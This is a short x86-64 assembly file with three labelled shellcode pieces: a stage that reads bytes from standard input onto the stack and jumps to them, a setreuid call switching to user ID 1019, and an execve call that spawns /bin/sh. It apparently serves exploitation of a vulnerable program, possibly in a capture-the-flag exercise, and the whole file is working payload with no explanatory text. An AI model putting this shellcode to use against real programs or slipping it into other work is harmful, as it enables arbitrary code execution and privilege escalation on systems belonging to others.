
; read shellcode

xor    eax,eax
xor    edi,edi
mov    rsi,rsp
push   0x40
pop    rdx
syscall
jmp rsp

; setreuid

xor    eax,eax
mov    al,0x69
xor    edi,edi
mov    di,1019
syscall

; execve("/bin/sh")

xor edx, edx
push rdx
mov rax, 0x68732f2f6e69622f
push rax
mov rdi, rsp
xor esi, esi
xor rax, rax
mov al, 0x3b
syscall